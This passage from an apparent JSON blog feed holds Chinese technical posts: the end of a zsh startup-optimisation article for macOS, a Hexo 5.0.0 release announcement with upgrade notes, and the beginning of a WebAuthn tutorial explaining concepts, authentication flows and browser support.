class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 